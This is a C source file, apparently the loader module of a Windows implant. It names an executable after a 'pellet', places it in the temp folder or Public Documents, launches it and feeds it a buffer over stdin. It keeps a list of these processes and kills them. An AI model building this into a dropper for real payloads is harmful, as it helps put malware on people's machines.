#include "Load.h"
#include "common.h"



Pld_path_info get_path_info() {

	Pld_path_info pldpathinfo = (Pld_path_info)allocheap(sizeof(ld_path_info));
	char* fail_safe_path = (char*)"C:\\Users\\Public\\Documents\\";
	ZeroMemory(pldpathinfo, sizeof(ld_path_info));
	pldpathinfo->bin_name = allocheap(BIN_NAME_SIZE + 1);
	ZeroMemory(pldpathinfo->bin_name, BIN_NAME_SIZE + 1);
	strcpy(pldpathinfo->bin_name, pellet_name);
	
	strcat(pldpathinfo->bin_name, ".exe");
	pldpathinfo->temp_dir = allocheap(MAX_PATH + strlen(pldpathinfo->bin_name) + 1);
	ZeroMemory(pldpathinfo->temp_dir, MAX_PATH + strlen(pldpathinfo->bin_name) + 1);
	GetTempPathA(MAX_PATH, pldpathinfo->temp_dir);
	if (strlen(pldpathinfo->temp_dir) > MAX_PATH - strlen(pldpathinfo->bin_name) - 1) {
		freeheap(pldpathinfo->temp_dir);
		pldpathinfo->temp_dir = allocheap(MAX_PATH * 2 + strlen(pldpathinfo->bin_name) + 1);
		ZeroMemory(pldpathinfo->temp_dir, MAX_PATH * 2 + strlen(pldpathinfo->bin_name) + 1);
		GetTempPathA(MAX_PATH, pldpathinfo->temp_dir);
	}
	strcat(pldpathinfo->temp_dir, pldpathinfo->bin_name);
	pldpathinfo->fail_safe_dir = allocheap(strlen(fail_safe_path) + strlen(pldpathinfo->bin_name) + 1);
	ZeroMemory(pldpathinfo->fail_safe_dir, strlen(fail_safe_path) + strlen(pldpathinfo->bin_name) + 1);
	strcpy(pldpathinfo->fail_safe_dir, fail_safe_path);
	strcat(pldpathinfo->fail_safe_dir, pldpathinfo->bin_name);
	return pldpathinfo;




}



void ldr_create_list(Psession_maintainance pmain) {
	pmain->ldr_head = (Pldr_session_list)allocheap(sizeof(ldr_session_list));
}
void ldr_path_info_free(Pld_path_info pinfo) {
	SecureZeroMemory(pinfo->bin_name, BIN_NAME_SIZE + 1);
	freeheap(pinfo->bin_name);
	freeheap(pinfo->temp_dir);
	freeheap(pinfo->fail_safe_dir);
	freeheap(pinfo);

}



ULONG create_write_proc(char* ppath, char* write_buffer, DWORD write_buffer_size, PULONG status, Psession_maintainance ldr_sess_main) {
	*status = -1;
	DWORD written = 0;
	SECURITY_ATTRIBUTES sa;
	LPPROCESS_INFORMATION pi = allocheap(sizeof(PROCESS_INFORMATION));
	ZeroMemory(pi, sizeof(PROCESS_INFORMATION));
	BOOL proc_spwn;
	STARTUPINFOA si = { sizeof(si) };
	HANDLE hstdoutrd, hstdoutwr = NULL;
	HANDLE hstdinrd, hstdinwr = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	CreatePipe(&hstdoutrd, &hstdoutwr, &sa, NULL);
	SetHandleInformation(hstdoutrd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&hstdinrd, &hstdinwr, &sa, NULL);
	SetHandleInformation(hstdoutwr, HANDLE_FLAG_INHERIT, 0);
	si.cb = sizeof(STARTUPINFOA);
	si.hStdError = hstdoutwr;
	si.hStdInput = hstdoutwr;
	si.hStdInput = hstdinrd;
	si.dwFlags |= STARTF_USESTDHANDLES;
	proc_spwn = CreateProcessA(ppath, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, pi);
	if (proc_spwn == FALSE) {
		*status = -1;
	}

	memcpy(&ldr_sess_main->ldr_head->ldr_session, &pi, sizeof(PPROCESS_INFORMATION));
	if (ldr_sess_main->ldr_first != NULL) {

		memcpy(&ldr_sess_main->ldr_temp->ptr, &ldr_sess_main->ldr_head, sizeof(Pldr_session_list));
		memcpy(&ldr_sess_main->ldr_temp, &ldr_sess_main->ldr_head, sizeof(Pldr_session_list));

	}
	else {
		memcpy(&ldr_sess_main->ldr_temp, &ldr_sess_main->ldr_head, sizeof(Pldr_session_list));
		memcpy(&ldr_sess_main->ldr_first, &ldr_sess_main->ldr_temp, sizeof(Pldr_session_list));
	}
	if (proc_spwn != FALSE) {
		written = 0;
		WriteFile(hstdinwr, (LPVOID)& write_buffer_size, sizeof(DWORD), &written, NULL);
		written = 0;
		WriteFile(hstdinwr, write_buffer, write_buffer_size, &written, NULL);
		written = 0;
		CloseHandle(hstdinwr);
		CloseHandle(hstdinrd);
		CloseHandle(hstdoutrd);
		CloseHandle(hstdoutwr);
	}
	return 0;


}

void ldr_terminate_list(Psession_maintainance ldr_sess_main) {
	ldr_sess_main->ldr_temp->ptr = NULL;
	memcpy(&ldr_sess_main->ldr_temp, &ldr_sess_main->ldr_first, sizeof(Pldr_session_list));
	while (ldr_sess_main->ldr_temp != NULL) {
		if (ldr_sess_main->ldr_temp->ldr_session != NULL) {
			if (ldr_sess_main->ldr_temp->ldr_session->hProcess != NULL) {
				TerminateProcess(ldr_sess_main->ldr_temp->ldr_session->hProcess, 0);
				Sleep(0x800);
			}
		}
		memcpy(&ldr_sess_main->ldr_prev, &ldr_sess_main->ldr_temp, sizeof(Pldr_session_list));
		memcpy(&ldr_sess_main->ldr_temp, &ldr_sess_main->ldr_temp->ptr, sizeof(Pldr_session_list));
		freeheap(ldr_sess_main->ldr_prev->ldr_session);
		freeheap(ldr_sess_main->ldr_prev);

	}
}


